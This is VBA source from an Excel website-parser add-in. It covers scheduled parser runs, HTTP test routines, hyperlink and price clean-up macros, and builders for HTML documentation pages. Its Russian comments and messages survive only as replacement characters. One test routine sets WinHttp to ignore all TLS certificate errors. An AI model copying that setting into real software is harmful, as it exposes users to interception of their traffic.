    If TaskName$ = "" Then ST_Err& = 1: GoTo ScheduledTaskError

    Set st = GetScheduledTaskByName(TaskName$)
    If st.ParserName = "" Then ST_Err& = 2: GoTo ScheduledTaskError        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    With st
        .Deactivate        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

        If .NeedsWorkbook Then
            If .TargetWorkbookName = "" Then ST_Err& = 3: GoTo ScheduledTaskError
            Wbname$ = Split(.TargetWorkbookName, "\")(UBound(Split(.TargetWorkbookName, "\")))
            If Wbname$ = "" Then ST_Err& = 4: GoTo ScheduledTaskError

            Set WB = Workbooks(CStr(Wbname$))
            If WB Is Nothing Then
                Set WB = Workbooks.Open(.TargetWorkbookName)
                If WB Is Nothing Then ST_Err& = 5: GoTo ScheduledTaskError
            End If
        End If

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If AllParsers().ParserExists(.ParserName) Then
            'If AllParsers(True).ParserExists(.ParserName) Then
            If .ParserName <> CURRENT_PARSER$ Then ActivateParser .ParserName        'UpdateAddinToolbar
            Debug.Print "Starting scheduled parser " & .ParserName & " at " & Now
            If ShowMsg Then AddBalloon "<strong>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</strong><br /><strong>|fffd||fffd||fffd||fffd||fffd||fffd|: </strong>" & .ParserName & _
               "<br /><strong>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: </strong>" & .OnTime & _
               "<br /><strong>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|: </strong>" & Now, bt_Information

            With AllParsers.GetActiveParser
                .Run
                .Class_Terminate
            End With
        Else
            ST_Err& = 6: GoTo ScheduledTaskError
        End If
    End With

    Set st = Nothing
    Exit Sub

ScheduledTaskError:
    Select Case ST_Err&
        Case 1: errmsg$ = "ScheduledTask name is empty. Contact the developer"
        Case 2: errmsg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '" & TaskName$ & "' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 3: errmsg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| '" & st.ParserName & "' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel, |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 4: errmsg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| '" & st.ParserName & "' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel, |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: '" & st.TargetWorkbookName & "'"
        Case 5: errmsg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| '" & st.TargetWorkbookName & "', |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 6: errmsg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| '" & st.ParserName & "'"
        Case Else: errmsg$ = "unknown error"
    End Select
    Debug.Print "Error running parser " & ST_Err&, TaskName$: Debug.Print errmsg$ & vbNewLine
    If ShowMsg Then AddBalloon "<strong>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</strong><br />" & errmsg$ & _
       "<br />|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Now, bt_Warning
    Set st = Nothing
End Sub

Function GetScheduledTaskByName(ByVal TaskName$) As ScheduledTask
    On Error Resume Next: Dim XML$
    Set GetScheduledTaskByName = New ScheduledTask
    XML$ = SETT.GetText(TaskName$, , "Scheduler")
    With GetScheduledTaskByName
        .Name = TaskName$
        If .LoadFromXML(XML) Then
            .ParserName = Split(TaskName$, ">")(0)
        End If
    End With
End Function

Function DeleteScheduledTasks(Optional ByVal ParserNameMask$ = "*") As Boolean
    On Error Resume Next: Dim dic As Dictionary, st As ScheduledTask
    Set dic = LoadAllScheduledTasks
    For Each st In dic
        If st.ParserName Like ParserNameMask$ Then st.Deactivate
    Next
    Set st = Nothing: Set dic = Nothing
End Function

Function LoadAllScheduledTasks() As Dictionary
    On Error Resume Next: Dim i&, arr, ind&, st As ScheduledTask
    Set LoadAllScheduledTasks = New Dictionary
    arr = GetAllSettings(PROJECT_NAME$, "Scheduler")
    If Not IsArray(arr) Then Exit Function
    For i = LBound(arr) To UBound(arr)
        If arr(i, 0) Like "?*>#*" Then
            Set st = New ScheduledTask
            st.Name = arr(i, 0)
            st.ParserName = Split(st.Name, ">")(0)
            If st.LoadFromXML(arr(i, 1)) Then
                LoadAllScheduledTasks.Add st, st.Name
            End If
        End If
    Next i
    Set st = Nothing
End Function

Private Sub test_ScheduledTask()
    With New ScheduledTask
        .ParserName = "test"
        .OnTime = Now + 6 / 86400
        .Activate
    End With

    With New ScheduledTask
        .ParserName = "parser"
        .OnTime = Now + 5 / 86400
        .Activate
    End With
End Sub

Function AddNewScheduledTask(ByVal ParserName$, ByVal StartTime$, ByVal TimeMode$, _
                             ByVal WorkbookInfo$, Optional ByVal Parameter$, _
                             Optional ByVal CancelPreviousTasks$, Optional ByRef WP As WebsiteParser) As ScheduledTask
    On Error Resume Next

    Dim ParserStartTime As Date, dt As Date, NeedsWorkbook As Boolean, TargetWorkbookName$, CancelPrevious As Boolean
    If Trim(ParserName$) = "" Then ParserName$ = WP.Name
    If Trim(ParserName$) = "" Then ParserName$ = CURRENT_PARSER
    If CancelPreviousTasks$ = "|fffd||fffd|" Then CancelPrevious = True

    dt = GetDate(StartTime$)
    Select Case TimeMode$
        Case "AfterLastStart", "AfterCurrentTime"
            ParserStartTime = Now + dt - Fix(dt)
        Case "ExactTime"
            If CDbl(dt) < Now Then
                dt = dt - Fix(dt) + CDbl(Date)
                If dt <= Now Then dt = dt + 1
            End If
            ParserStartTime = dt
    End Select

    If WorkbookInfo$ = "|fffd||fffd||fffd|" Then
        NeedsWorkbook = False

    ElseIf WorkbookInfo$ Like "|fffd||fffd|*" Then
        NeedsWorkbook = True
        TargetWorkbookName$ = ActiveWorkbook.FullName
        'if TargetWorkbookName$="" then error = no active workbook
    Else
        If InStr(1, WorkbookInfo$, "\") Then
            If FWF.FileExists(WorkbookInfo$) Then
                NeedsWorkbook = True
                TargetWorkbookName$ = WorkbookInfo$
            Else
                ' error = file not found
            End If
        End If
    End If

    If CancelPrevious Then DeleteScheduledTasks ParserName$

    With New ScheduledTask
        .ParserName = ParserName$
        .OnTime = ParserStartTime
        .NeedsWorkbook = NeedsWorkbook
        .TargetWorkbookName = TargetWorkbookName$
        .Parameter = Parameter$
        .Activate
    End With
End Function


Attribute VB_Name = "mod_Test"
'---------------------------------------------------------------------------------------
' Module        : mod_Test                    Version:
' Author        : Igor Vakhnenko                   Date: 23.11.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module
Option Compare Text

Public Const WM_KEYDOWN = &H100, WM_SETFOCUS = &H7, WM_USER = &H400, WM_KEYUP = &H101, WM_KILLFOCUS = &H8
Public Const WM_A = &H41, WM_C = &H43

Private Sub test_ozon()
    ' https://support.microsoft.com/en-gb/help/3140245/update-to-enable-tls-1-1-and-tls-1-2-as-default-secure-protocols-in-wi
    URL$ = "https://www.ozon.ru/context/detail/id/147755921/"
    ' |fffd||fffd||fffd| winhttp
    ' https://docs.microsoft.com/en-us/windows/win32/wsdapi/capturing-winhttp-logs?redirectedfrom=MSDN
    
'    With New WinHttpRequest
'        'Debug.Print .Option(WinHttpRequestOption_EnableHttp1_1)
'        '.Option(WinHttpRequestOption_SecureProtocols) = 2720
'        '.Option(WinHttpRequestOption_EnableHttp1_1) = 0
'        '.Option(WinHttpRequestOption_SslErrorIgnoreFlags) = 13056
'
'       ' .SetProxy 2, "127.0.0.1:8888"
'
'        .Open "GET", URL$, False
'        .Send
'        Debug.Print .ResponseText
'    End With
    
    'On Error Resume Next
    Dim oHttp As WinHttpRequest
    Set oHttp = New WinHttpRequest

    oHttp.Open "GET", URL, False

    oHttp.Option(WinHttpRequestOption_UserAgentString) = "http_requester/0.1"
    oHttp.Option(WinHttpRequestOption_SslErrorIgnoreFlags) = &H3300            '  ignore all err, 0: accept no err
    oHttp.Option(WinHttpRequestOption_EnableRedirects) = False 'True
    oHttp.Option(WinHttpRequestOption_EnableHttpsToHttpRedirects) = True

    oHttp.Send

    Do While True
        DoEvents
        If oHttp.Status Then Exit Do
    Loop

    Debug.Print oHttp.Status
    
    
    '    httpRequest.Option(9) = 2720
    '    Works only in Windows 2012 and newer
    '
    '    System library "winhttp.dll" of Windows 2008 R2 has only record for TLS 1.0 what equal to:
    '
    '    httpRequest.Option(9) = 128
    '    The other values will drop an exception.
    
End Sub

Private Sub test_winhttp_ssl()
    ' https://support.microsoft.com/en-gb/help/3140245/update-to-enable-tls-1-1-and-tls-1-2-as-default-secure-protocols-in-wi
    URL$ = "https://www.ozon.ru/context/detail/id/147755921/"
    
    Set wHTTP = New WinHttpRequest
    With wHTTP
        .Open "GET", "https://howsmyssl.com/a/check", False
        .Send
        Debug.Print Split(.ResponseText, """tls_version""")(1)
    End With
    
    
    '    httpRequest.Option(9) = 2720
    '    Works only in Windows 2012 and newer
    '
    '    System library "winhttp.dll" of Windows 2008 R2 has only record for TLS 1.0 what equal to:
    '
    '    httpRequest.Option(9) = 128
    '    The other values will drop an exception.
    
End Sub

Sub CleanHeader_PriceMonitoring()
    On Error Resume Next
    Dim cell As Range, txt$
    Application.ScreenUpdating = False
    With Intersect(ActiveSheet.UsedRange, Selection)
        For Each cell In .Cells
            txt = cell.value
            If Len(txt) Then
                cell.Hyperlinks.Delete
                If txt Like "*//?*" Then txt = Split(txt, "//")(1)
                txt = Split(txt, "/")(0)
                txt = Replace(txt, "www.", "")
                txt = Trim(txt)
                cell.value = txt
            End If
        Next cell
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
    End With
    Application.ScreenUpdating = True
End Sub

Sub RestoreHyperlinksStyle()
    Dim cell As Range, sh As Worksheet
    Application.ScreenUpdating = False
    For Each sh In ActiveWorkbook.Worksheets
        For Each cell In sh.UsedRange.SpecialCells(xlCellTypeConstants)
            If cell.Hyperlinks.Count Then cell.Style = "Hyperlink"
        Next cell
    Next sh
    Application.ScreenUpdating = True
    MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbInformation
End Sub

Sub ReplaceHyperlinkText()
    Dim cell As Range
    Application.ScreenUpdating = False
    For Each cell In ActiveSheet.UsedRange.SpecialCells(xlCellTypeConstants)
        If cell.Hyperlinks.Count Then cell.value = "xxx"
    Next cell
    Application.ScreenUpdating = True
End Sub

Sub ReplaceHyperlinkText_URLs()
    Dim cell As Range
    Application.ScreenUpdating = False
    For Each cell In Intersect(Selection, ActiveSheet.UsedRange)
        If cell.Hyperlinks.Count Then cell.value = cell.Hyperlinks(1).Address
    Next cell
    Application.ScreenUpdating = True
End Sub

Sub ReplaceHyperlinkText_Prices()
    Dim cell As Range
    Application.ScreenUpdating = False
    For Each cell In ActiveSheet.UsedRange.SpecialCells(xlCellTypeConstants)
        If cell.Hyperlinks.Count Then Randomize: cell.value = Application.RoundUp(Val(cell.value) + (Rnd(1) - 0.5) * 3000, -1)
    Next cell
    Application.ScreenUpdating = True
End Sub

Sub Pr_PM()
    Dim APs As WebsiteParsers, WP As WebsiteParser, WP_name
    Set APs = AllParsers(True)
    If APs.Items.Count = 0 Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub
    
    For Each WP_name In APs.Items
        Set WP = AllParsers.GetParserByName(WP_name)
        WP.Locked = True
        WP.Protection.Extra_Common = True
        WP.Protection.Extra_Actions = False
        
        With WP.SourceData
            If .Mode = ps_FoundColumn Then
                If .FoundColumnMode_Find_Text Like "*{ParserName}*" Then
                    .FoundColumnMode_Find_Text = Replace(.FoundColumnMode_Find_Text, "{ParserName}", WP_name)
                End If
            End If
            
            If .Mode = ps_SheetRange Then
                If .SheetRangeMode_Find_Text Like "*{ParserName}*" Then
                    .SheetRangeMode_Find_Text = Replace(.SheetRangeMode_Find_Text, "{ParserName}", WP_name)
                End If
            End If
        End With
        WP.Save True
        
    Next WP_name
End Sub

Sub Up_PM()
    Dim APs As WebsiteParsers, WP As WebsiteParser, WP_name
    Set APs = AllParsers(True)
    If APs.Items.Count = 0 Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub
    
    For Each WP_name In APs.Items
        Set WP = AllParsers.GetParserByName(WP_name)
        WP.Locked = False
        
        With WP.SourceData
            If .Mode = ps_FoundColumn Then
                If .FoundColumnMode_Find_Text Like "*" & WP_name & "*" Then
                    .FoundColumnMode_Find_Text = Replace(.FoundColumnMode_Find_Text, WP_name, "{ParserName}")
                End If
            End If
            
            If .Mode = ps_SheetRange Then
                If .SheetRangeMode_Find_Text Like "*" & WP_name & "*" Then
                    .SheetRangeMode_Find_Text = Replace(.SheetRangeMode_Find_Text, WP_name, "{ParserName}")
                End If
            End If
        End With
        WP.Save True
        
    Next WP_name
End Sub

Function CreateHTMLListFromArray(ByRef arr) As String
    On Error Resume Next
    Dim i&, txt$
    txt$ = txt$ & "<ul class='parser-description parser-source-data'>" & vbNewLine
    For i = LBound(arr) To UBound(arr)
        txt$ = txt$ & "  <li>" & arr(i) & "</li>" & vbNewLine
    Next i
    txt$ = txt$ & "</ul>" & vbNewLine
    CreateHTMLListFromArray = txt$
End Function

Private Sub CreateActionsListForWebsite()
    On Error Resume Next
    Dim cat&, arr As Variant, i&, aa As ArrayAction, CodenamesArray As Variant, txt$
    With All_AAs
        Dim AllCategories As Collection, Category As Variant, CategoriesColl As New Collection
        Set AllCategories = .GetAllCategories
        'Debug.Print Me.AAs.Items.Count + AllCategories.Count * 2, Me.AAs.Items.Count, AllCategories.Count
        ReDim arr(1 To .Items.Count + AllCategories.Count, 0 To 1)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        
        For Each Category In AllCategories
            txt = txt & vbNewLine & vbNewLine & "<h2>|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & .GetFunctionCategoryTXT(Val(Category)) & _
                "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</h2>" & vbNewLine
            txt = txt & "<ul class='actions-links'>" & vbNewLine
            For Each aa In .Items
                If aa.Category = Val(Category) Then
                    With aa
                        txt = txt & "   <li><a href='/programmes/Parser/actions/" & .Codename & "'>" & .Name & "</a></li>" & vbNewLine
                    End With
                End If
            Next
            txt = txt & "</ul>" & vbNewLine
            ' If MsgBox(txt, vbOKCancel + vbDefaultButton2) = vbCancel Then Exit For
        Next Category
        
        Set AllCategories = Nothing
    End With
    ShowText txt
End Sub

Private Sub CreateActionsListForYandexWebmaster()
    On Error Resume Next
    Dim cat&, arr As Variant, i&, aa As ArrayAction, CodenamesArray As Variant, txt$
    With All_AAs
        Dim AllCategories As Collection, Category As Variant, CategoriesColl As New Collection
        Set AllCategories = .GetAllCategories
        'Debug.Print Me.AAs.Items.Count + AllCategories.Count * 2, Me.AAs.Items.Count, AllCategories.Count
        ReDim arr(1 To .Items.Count + AllCategories.Count, 0 To 1)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        
        For Each Category In AllCategories
            txt = txt & vbNewLine & vbNewLine & "<h2>|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & .GetFunctionCategoryTXT(Val(Category)) & _
                "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</h2>" & vbNewLine
            txt = txt & "<ul class='actions-links'>" & vbNewLine
            For Each aa In .Items
                If aa.Category = Val(Category) Then
                    With aa
                        ' <li><a href='/programmes/Parser/actions/FirstArrayItems'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|</a></li>
                        '    txt = txt & "https://ExcelVBA.ru/programmes/Parser/actions/" & .Codename & vbNewLine
                        
                        txt = txt & "<li><a href='/programmes/Parser/actions/" & .Codename & "'>" & .Name & "</a></li>" & vbNewLine
                    End With
                End If
            Next
            txt = txt & "</ul>" & vbNewLine
            ' If MsgBox(txt, vbOKCancel + vbDefaultButton2) = vbCancel Then Exit For
        Next Category
        
        Set AllCategories = Nothing
    End With
    ShowText txt
End Sub

Private Sub PublishActionsManual()
    On Error Resume Next
    Dim cat As FUNCTION_CATEGORIES, i&, aa As ArrayAction, txt$, AAP As ArrayActionParameter, descr$, StyleTXT$, OptionsTXT$, DefValueTXT$
    
    cat = fc_Plugins
    For Each aa In All_AAs.Items
        If aa.Category = cat Then
            With aa
                txt = txt & "Path:  programmes/Parser/actions/" & .Codename & vbNewLine
                txt = txt & "H1: " & .Name & vbNewLine & vbNewLine
                descr$ = ""
                
                If .parameters.Count = 0 Then
                    txt = txt & "<h3 class='parameter-list parameter-list-blank'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</span></h3> " & vbNewLine
                Else
                    txt = txt & "<h3 class='parameter-list'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</h3> " & vbNewLine
                    txt = txt & "<ul class='action-parameters'>" & vbNewLine
                    For Each AAP In .parameters
                        With AAP
                            txt = txt & "   <li><a href='#" & .Name & "'>" & .Description & "</a></li>" & vbNewLine
                            
                            OptionsTXT$ = "": DefValueTXT$ = ""
                            Select Case .Style
                                Case aps_Combo
                                    StyleTXT$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                                    OptionsTXT$ = "<p class='param-options param-available'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>" & Join(.OptionsList, "; ") & "</span></p>"
                                    If Len(.DefaultValue) Then
                                        DefValueTXT$ = "<p class='param-options param-default'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>" & .DefaultValue & "</span></p>"
                                    End If
                                Case aps_List
                                    StyleTXT$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                                    OptionsTXT$ = "<p class='param-options param-available'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>" & Join(.OptionsList, "; ") & "</span></p>"
                                    DefValueTXT$ = "<p class='param-options param-default'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>" & .DefaultValue & "</span></p>"
                                Case aps_Text
                                    StyleTXT$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                                    If Len(.DefaultValue) Then
                                        DefValueTXT$ = "<p class='param-options param-default'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>" & .DefaultValue & "</span></p>"
                                    End If
                                Case aps_RuntimeList
                                    StyleTXT$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| " & .OptionsList
                                Case Else
                                    StyleTXT$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            End Select
                            
                            descr$ = descr$ & "<h3 class='param-name'><a name='" & .Name & "'></a>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|<span>" & .Description & "</span>|fffd|</h3>" & vbNewLine
                            descr$ = descr$ & "<div class='parameter'>" & vbNewLine & _
                                "<p class='param-options param-type'>|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>" & StyleTXT$ & "</span></p>" & vbNewLine
                            If Len(OptionsTXT$) Then descr$ = descr$ & OptionsTXT$ & vbNewLine
                            If Len(DefValueTXT$) Then descr$ = descr$ & DefValueTXT$ & vbNewLine
                            descr$ = descr$ & "</div>" & vbNewLine & "<p class='param-description'>&nbsp;</p> " & vbNewLine
                            
                        End With
                    Next
                    txt = txt & "</ul>" & vbNewLine
                    
                End If
                
                txt = txt & vbNewLine & "<h3>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</h3> " & vbNewLine
                txt = txt & "<p class='action-purpose'>" & Replace(.Description, vbNewLine, "<br />") & "</p> " & vbNewLine
                
                txt = txt & vbNewLine & "<h3 class='return-value'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <span>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</span></h3> " & vbNewLine
                txt = txt & "<p>&nbsp;</p> " & vbNewLine
                txt = txt & "<hr> " & vbNewLine
                txt = txt & descr$ & "<p>&nbsp;</p><h3>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</h3>" & vbNewLine
                
                
                txt = txt & vbNewLine & "==============================================" & vbNewLine
            End With
        End If
    Next
    
    ShowText txt
End Sub


Private Sub test32423453546346456()
    Dim pi As New ProgressIndicatorNew
    pi.Show "test"
    For i = 1 To 50000
        pi.ShowMessage "test  " & " " & GetUnicodeProgressLine(i / 50000)
        DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents:
        DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents:
    Next
    pi.Hide
End Sub

Function GetUnicodeProgressLine(ByVal Percent As Single, Optional ByVal LineLength& = 20) As String
    On Error Resume Next: Dim v1&, v2&, v3&
    v1 = Fix(Percent * LineLength&)
    If Percent * LineLength& - v1 >= 0.5 Then v2 = 1
    v3 = LineLength& - v1& - v2&
    GetUnicodeProgressLine = String(v1&, ChrW(9632)) & String(v2&, ChrW(9637)) & String(v3&, ChrW(9633))
End Function

Function GetUnicodeSlider(ByVal Percent As Single, Optional ByVal LineLength& = 20) As String
    On Error Resume Next: Dim v1&, v2&, v3&, TextBlock$
    v1 = Fix(Percent * LineLength&)
    If Percent * LineLength& - v1 >= 0.5 Then v2 = 1
    v3 = LineLength& - v1& - v2&
    'GetUnicodeSlider = String(5, ChrW(9632)) & String(5, ChrW(9637)) & String(5, ChrW(9633))
    TextBlock$ = ChrW(9632) & " " & ChrW(9632) & " " & ChrW(9632)
    TextBlock$ = ChrW(9608) & " " & ChrW(9608) & " " & ChrW(9608)
    GetUnicodeSlider = String(v1, " ") & TextBlock$ & String(15, " ") & TextBlock$ & String(15, " ") & TextBlock$ & String(15, " ") & TextBlock$
End Function

Sub Run_ExtraProgressBar_Slider()
    On Error Resume Next
    If CurrentPIuserform Is Nothing Then Exit Sub
    Dim LastLen&, i&: Const SLIDER_CHAR_CODE& = 9607, CHAR_INTERVAL& = 100    '25
    
    Static TextLine$, TextBlock$
    If TextBlock$ = "" Then TextBlock$ = ChrW(SLIDER_CHAR_CODE&) & " " & ChrW(SLIDER_CHAR_CODE&) & " " & ChrW(SLIDER_CHAR_CODE&)
    If TextLine$ = "" Then
        For i = 1 To 24: TextLine$ = TextLine$ & TextBlock$ & String(CHAR_INTERVAL&, " ")
        Next i
    End If
    
    LastLen& = Val(CurrentPIuserform.ExtraBar.Tag)
    If LastLen& = 0 Then LastLen& = Len(TextBlock$) Else LastLen& = LastLen& + 3
    If LastLen& > Len(TextLine$) Then LastLen& = LastLen& - Len(TextLine$) / 2
    
    CurrentPIuserform.ExtraBar = StrReverse(Left(TextLine$, LastLen&))
    CurrentPIuserform.ExtraBar.Tag = LastLen&
    
    RunWithDelay "Run_ExtraProgressBar_Slider", 0.3
End Sub

'Private Sub test_variables()
'    UserForm1.Show
'    Dim Vars As New Variables
'    With Vars.Add
'        .ControlType = "Checkbox"
